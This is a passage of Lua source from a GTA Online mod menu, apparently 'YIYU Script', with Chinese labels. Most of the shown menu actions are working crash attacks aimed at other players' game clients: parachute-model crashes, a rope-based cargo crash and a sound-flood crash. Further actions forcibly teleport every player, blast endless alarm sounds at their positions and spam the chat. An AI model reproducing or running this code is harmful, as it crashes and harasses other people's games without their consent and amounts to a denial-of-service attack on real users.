                PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 800, false, true, true)
                util.yield(200)
                VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 	148511758)
                VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
                util.yield(200)
                entities.delete_by_handle(Ruiner2)
            end
      
            for i = 1, 10 do
                local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
                local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
                PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 500, false, true, true)
                util.yield(100)
                VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 	260873931)
                VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
                util.yield(100)
                entities.delete_by_handle(Ruiner2)
            end
            util.yield(200)

            for i = 1, 5 do
                local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
                local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
                PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 300, false, true, true)
                util.yield(500)
                VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 1381105889)
                VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
                util.yield(500)
                entities.delete_by_handle(Ruiner2)
            end

            for i = 1, 25 do
                local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
                local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
                PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 200, false, true, true)
                util.yield(150)
                VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 	1500925016)
                VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
                util.yield(150)
                entities.delete_by_handle(Ruiner2)
            end
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
            --^^
            for n = 0 , 2 do
                local object_hash = util.joaat("prop_logpile_06b")
                STREAMING.REQUEST_MODEL(object_hash)
                  while not STREAMING.HAS_MODEL_LOADED(object_hash) do
                   util.yield()
                end
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,100, false, true, true)
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 100, false)
                util.yield(800)
                for i = 0 , 1 do
                    PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
                end
                util.yield(800)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
        
                local object_hash2 = util.joaat("prop_beach_parasol_03")
                STREAMING.REQUEST_MODEL(object_hash2)
                  while not STREAMING.HAS_MODEL_LOADED(object_hash2) do
                   util.yield()
                end
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash2)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,100, 0, 0, 1)
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 100, false)
                util.yield(800)
                for i = 0 , 1 do
                    PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
                end
                util.yield(800)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
            end
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)


            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
            TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
            util.yield()
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
            util.yield(300)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
            util.yield(1000)

            for i = 1, 10 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x,pos.y,pos.z, 0, false, false, 0)
            for i = 1, 2 do
                local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
                local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
                PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 150, false, true, true)
                util.yield(200)
                VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 	1500925016)
                VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
                util.yield(200)
                entities.delete_by_handle(Ruiner2)
            end
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
            for i = 1, 2 do
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
            TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
            util.yield()
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
            util.yield(200)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
            util.yield(4500)
            for i = 1, 2 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x,pos.y,pos.z, 0, false, false, 0)

        end
        notification("崩溃完成", colors.black)
        end)
menu.action(all, "载具伞崩V1", {}, "", function ()
    local spped = PLAYER.PLAYER_PED_ID()
    local ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
    for i = 1, 15 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
        util.yield(200)
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 260873931)
        VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(200)
        entities.delete_by_handle(Ruiner2)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)

    end)

    menu.action(all, "载具伞崩V2", {}, "", function ()
        notification("开始崩溃", colors.black)
        local spped = PLAYER.PLAYER_PED_ID()
        local ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
        for i = 1, 30 do
            local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
            local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
            PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 2200, false, true, true)
            util.yield(130)
            VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 	3235319999)
            VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
            util.yield(130)
            entities.delete_by_handle(Ruiner2)
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
        notification("崩溃完成", colors.black)
        end)
        menu.action(all, "手动载具伞崩", {}, "", function ()
            notification("开始崩溃，请反复按空格键", colors.black)
        local spped = PLAYER.PLAYER_PED_ID()
        local ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
            local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
            local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
            PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 800, false, true, true)
            util.yield(200)
            VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 148511758)
            VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
            util.yield(300000)
            entities.delete_by_handle(Ruiner2)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
        end)
    menu.action(all, "人物伞崩V1", {}, "", function()
    local SelfPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    for n = 0 , 3 do
        local object_hash = util.joaat("prop_logpile_06b")
        STREAMING.REQUEST_MODEL(object_hash)
          while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, false, true, true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)

        local object_hash2 = util.joaat("prop_beach_parasol_03")
        STREAMING.REQUEST_MODEL(object_hash2)
          while not STREAMING.HAS_MODEL_LOADED(object_hash2) do
           util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash2)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
end)

menu.action(all,"人物伞崩V2", {}, "", function()
    for n = 0 , 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash = 1381105889
                                    STREAMING.REQUEST_MODEL(object_hash)
      while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        bush_hash = 720581693
                                    STREAMING.REQUEST_MODEL(bush_hash)
      while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
           util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        end
end)
menu.action(all,"人物伞崩V3",{},"",function()
    for n = 0 , 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash =192829538
                                    STREAMING.REQUEST_MODEL(object_hash)
      while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        bush_hash = 	192829538
                                    STREAMING.REQUEST_MODEL(bush_hash)
      while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
           util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
end
end)

menu.action(all,"人物伞崩V4",{},"",function()
    for n = 0 , 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash = 1117917059
                                    STREAMING.REQUEST_MODEL(object_hash)
      while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        bush_hash = 1117917059
                                    STREAMING.REQUEST_MODEL(bush_hash)
      while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
           util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
end
end)

menu.action(all,"大自然全局崩溃",{},"",function()
    local user = players.user()
    local user_ped = players.user_ped()
    local pos = players.get_position(user)
        util.yield(80)
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
        TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
        util.yield()
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
        util.yield(250)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        util.yield(1000)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x,pos.y,pos.z, 0, false, false, 0)
    end)

    menu.action(all, "CARGO崩溃", {}, "", function()
    menu.trigger_commands("anticrashcam on")
    local cspped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TPpos = ENTITY.GET_ENTITY_COORDS(cspped, true)
    local cargobob = CreateVehicle(0XFCFCB68B, TPpos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    local cargobobPos = ENTITY.GET_ENTITY_COORDS(cargobob, true)
    local veh = CreateVehicle(0X187D938D, TPpos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    local vehPos = ENTITY.GET_ENTITY_COORDS(veh, true)
    local newRope = PHYSICS.ADD_ROPE(TPpos.x, TPpos.y, TPpos.z, 0, 0, 10, 1, 1, 0, 1, 1, false, false, false, 1.0, false, 0)
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, veh, cargobobPos.x, cargobobPos.y, cargobobPos.z, vehPos.x, vehPos.y, vehPos.z, 2, false, false, 0, 0, "Center", "Center")
    util.yield(2500)
    entities.delete_by_handle(cargobob)
    entities.delete_by_handle(veh)
    PHYSICS.DELETE_CHILD_ROPE(newRope)
    menu.trigger_commands("anticrashcam off")
end)


menu.action(all,"网络声音崩溃", {}, "", function()
    local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local time = util.current_time_millis() + 2000
    while time > util.current_time_millis() do
    local TPPS = ENTITY.GET_ENTITY_COORDS(TPP, true)
        for i = 1, 20 do
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
        end
        util.yield()
        for i = 1, 20 do
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
        end
        util.yield()
    end
end)

menu.divider(all, "====恶搞选项====")
menu.action(all, "发送所有玩家到海滩", {}, "", function () 

    for pid = 0, 32 do

        if pid ~= players.user() and players.exists(pid) then

			util.trigger_script_event(1 << pid, {330622597 ,2, 0, 0, 4, 0,PLAYER.GET_PLAYER_INDEX(), pid})

		end

	end

end)


menu.action(all, "发送所有玩家到佩里科岛", {}, "", function () 

    for pid = 0, 31 do

		if pid ~= players.user() and players.exists(pid) then

                util.trigger_script_event(1 << pid, {-369672308, 0, 0, 0, 0, 0,PLAYER.GET_PLAYER_INDEX(), pid})

		end

	end

end)

menu.action(all,"防空警报", {oooooooooooooo}, "oooooooooooooo", function()
    local pos, exp_pos = v3(), v3()
    local Audio_POS = {v3(-73.31681060791,-820.26013183594,326.17517089844),v3(2784.536,5994.213,354.275),v3(-983.292,-2636.995,89.524),v3(1747.518,4814.711,41.666),v3(1625.209,-76.936,166.651),v3(751.179,1245.13,353.832),v3(-1644.193,-1114.271,13.029),v3(462.795,5602.036,781.400),v3(-125.284,6204.561,40.164),v3(2099.765,1766.219,102.698)}
    
    for i = 1, #Audio_POS do

    AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "DLC_sum20_Business_Battle_AC_Sounds", true, 999999999, true)
    pos.z = 2000.00
    
    AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "DLC_sum20_Business_Battle_AC_Sounds", true, 999999999, true)
        pos.z = -2000.00
    
    AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "DLC_sum20_Business_Battle_AC_Sounds", true, 999999999, true)
    
    for pid = 0, 31 do
        local pos =	NETWORK._NETWORK_GET_PLAYER_COORDS(pid)
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", pos.x, pos.y, pos.z, "DLC_sum20_Business_Battle_AC_Sounds", true, 999999999, true)
    end

    end
end
)
menu.action(all,"聋的传人", {oooooooooooooo}, "oooooooooooooo", function()
local pos = v3()
local Audio_POS = {v3(-73.31681060791,-820.26013183594,326.17517089844),v3(2784.536,5994.213,354.275),v3(-983.292,-2636.995,89.524),v3(1747.518,4814.711,41.666),v3(1625.209,-76.936,166.651),v3(751.179,1245.13,353.832),v3(-1644.193,-1114.271,13.029),v3(462.795,5602.036,781.400),v3(-125.284,6204.561,40.164),v3(2099.765,1766.219,102.698)}

for i = 1, #Audio_POS do

    AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "WastedSounds", true, 999999999, true)
    pos.z = 2000.00

    AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "WastedSounds", true, 999999999, true)
    pos.z = -2000.00

    AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "WastedSounds", true, 999999999, true)

    for pid = 0, 31 do
        local pos =	NETWORK._NETWORK_GET_PLAYER_COORDS(pid)
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", pos.x, pos.y, pos.z, "WastedSounds", true, 999999999, true)
    end
end		
end)

local players_list = menu.list(yiyumain, "                           玩家选项", {}, "")


world=menu.list(yiyumain, "                           世界选项", {}, "", function(); end)


hd= menu.list(world, "黑洞选项", {}, "", function(); end)


local blackHoleMenu = menu.toggle(hd, "黑洞开关", {}, "", function(a)
    blackHole = a
end)
local pushStrengthMenu = menu.slider(hd, "黑洞强度", {}, "", 1, 100, 1, 1, function(a)
    pushStrength = a
end)

local blackHolePosX = menu.slider(hd, "黑洞位置 X", {"coordBlackHoleX"}, "黑洞在地图X轴的坐标", -100000, 100000, 0, 1, function(a)
    blackHolePos.x = a
end)

local blackHolePosY = menu.slider(hd, "黑洞位置 Y", {"coordBlackHoleY"}, "黑洞在地图Y轴的坐标", -100000, 100000, 0, 1, function(a)
    blackHolePos.y = a
end)

local blackHolePosZ = menu.slider(hd, "黑洞位置 Z", {"coordBlackHoleZ"}, "黑洞在地图Z轴的坐标", -100000, 100000, 0, 1, function(a)
    blackHolePos.z = a
end)

menu.action(hd, "将黑洞设置在你当前的位置", {}, "", function()
    blackHolePos.x = yourselfCoord.x
    blackHolePos.y = yourselfCoord.y
    blackHolePos.z = yourselfCoord.z
    blackHolePosX.value = math.floor(blackHolePos.x)
    blackHolePosY.value = math.floor(blackHolePos.y)
    blackHolePosZ.value = math.floor(blackHolePos.z)
end)

util.create_tick_handler(function()
    if ENTITY.DOES_ENTITY_EXIST(visualHelpEnt) then
        if visualHelp == true then
            ENTITY.SET_ENTITY_COORDS(visualHelpEnt, blackHolePos.x, blackHolePos.y, blackHolePos.z, false, false, false, false)
        elseif visualHelp == false then
            ENTITY.SET_ENTITY_COORDS(visualHelpEnt, 0, 0, 0, false, false, false, false)
        end
    else
        visualHelpEnt = entities.create_object(entityToSpawn, blackHolePos)
        ENTITY.FREEZE_ENTITY_POSITION(visualHelpEnt, true)
        ENTITY.SET_ENTITY_COLLISION(visualHelpEnt, true, false)
    end
    util.yield(100)
end)


util.create_tick_handler(function()
    yourself = PLAYER.GET_PLAYER_PED(players.user())
    yourselfCoord = ENTITY.GET_ENTITY_COORDS(yourself)
    if blackHole == true then
        blackHoleVehicle = entities.get_all_vehicles_as_handles()
        for index, value in ipairs(blackHoleVehicle) do
            vehiclePos = ENTITY.GET_ENTITY_COORDS(value)
            if ENTITY.DOES_ENTITY_EXIST(value) == true then
                if NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(value) == false then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(value)
                end

                if blackHoleType == "black" then
                   
                    if blackHolePos.x > vehiclePos.x then
                        pushToX = pushStrength
                    elseif blackHolePos.x < vehiclePos.x then
                        pushToX = -pushStrength
                    end
                    if blackHolePos.y > vehiclePos.y then
                        pushToY = pushStrength
                    elseif blackHolePos.y < vehiclePos.y then
                        pushToY = -pushStrength
                    end
                    if blackHolePos.z > vehiclePos.z then
                        pushToZ = pushStrength
                    elseif blackHolePos.z < vehiclePos.z then
                        pushToZ = -pushStrength
                    end
                    ENTITY.APPLY_FORCE_TO_ENTITY(value, 1, pushToX, pushToY, pushToZ, 0, 0, 0, 0, false, true, true, false)
                elseif blackHoleType == "white" then
                    if blackHolePos.x > vehiclePos.x then
                        pushToX = -pushStrength
                    elseif blackHolePos.x < vehiclePos.x then
                        pushToX = pushStrength
                    end
                    if blackHolePos.y > vehiclePos.y then
                        pushToY = -pushStrength
                    elseif blackHolePos.y < vehiclePos.y then
                        pushToY = pushStrength
                    end
                    if blackHolePos.z > vehiclePos.z then
                        pushToZ = -pushStrength
                    elseif blackHolePos.z < vehiclePos.z then
                        pushToZ = pushStrength
                    end
                    ENTITY.APPLY_FORCE_TO_ENTITY(value, 1, pushToX, pushToY, pushToZ, 0, 0, 0, 0, false, true, true, false)
                end
            end
        end
    end
end)



menu.toggle_loop(world,"循环生成闪电", {}, "", function()
    MISC.FORCE_LIGHTNING_FLASH()
end)
menu.toggle(world, "停电V1", {"poweroutage"}, "", function(toggled)
    GRAPHICS.SET_ARTIFICIAL_LIGHTS_STATE(toggled)
end)

menu.toggle(world, "停电V2", {"blackout"}, "", function(toggled)
    menu.trigger_commands("time 1")
    GRAPHICS.SET_ARTIFICIAL_LIGHTS_STATE(toggled)
    if toggled then
        GRAPHICS.SET_TIMECYCLE_MODIFIER("dlc_island_vault")
    else
        GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
    end
end)
menu.toggle(world, "NPC暴动", {''}, "", function(toggle)
    MISC.SET_RIOT_MODE_ENABLED(toggle)
end)
menu.action(world, "清理敌人", {}, "", function()
    local counter = 0
    for _, ped in entities.get_all_peds_as_handles() do
        if HUD.GET_BLIP_COLOUR(HUD.GET_BLIP_FROM_ENTITY(ped)) == 1 or TASK.GET_IS_TASK_ACTIVE(ped, 352) then -- shitty way to go about it but hey, it works (most of the time).
            ENTITY.SET_ENTITY_HEALTH(ped, 0)
            counter += 1
            util.yield()
        end
    end
    if counter == 0 then
        notification("没有发现敌人==", colors.black)
    else
        notification("已清理 ".. tostring(counter) .." 个敌人.", colors.black)
    end
end)


Chat = menu.list(yiyumain, "                           聊天选项", {}, "", function(); end)


menu.divider(Chat, "公屏选项")
menu.toggle(Chat, "隐藏输入状态", {}, "", function()
	if on then
		menu.trigger_commands("hidetyping on")
	else
		menu.trigger_commands("hidetyping off")
	end
end)


menu.action(Chat,"清屏", {},"",function()
    for i = 1, 100 do

local ret = "  "
    chat.send_message(ret, false, true, true)
    end
end)

menu.action(Chat,"踢广告机", {},"",function()
    chat.send_message("正在踢出广告机\n---------‹ ", false, true, true)
    util.yield(2000)
    chat.send_message("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n=======YIYU Script=======\n ‹ 已自动踢出广告机 ‹      \n=========(=•w•=)=======",false,true,true)
end)
menu.action(Chat,"社会主义核心价值观",{},"",function()
    local shzy1 = "富强 民主 文明 和谐"
    local shzy2 = "自由 平等 公正 法制"
    local shzy3 = "爱国 敬业 诚信 友善"
    chat.send_message(shzy1, false, true, true)
    util.yield(1000)
    chat.send_message(shzy2, false, true, true)
    util.yield(1000)
    chat.send_message(shzy3, false, true, true)
    util.yield(850)
    end)
    
 
fanghu=menu.list(yiyumain, "                           防护选项", {}, "", function(); end)
menu.divider(fanghu, "防护选项")

menu.action(fanghu, "强制停止所有声音", {""}, "", function()
    for i=-1,100 do
        AUDIO.STOP_SOUND(i)
        AUDIO.RELEASE_SOUND_ID(i)
    end
end)
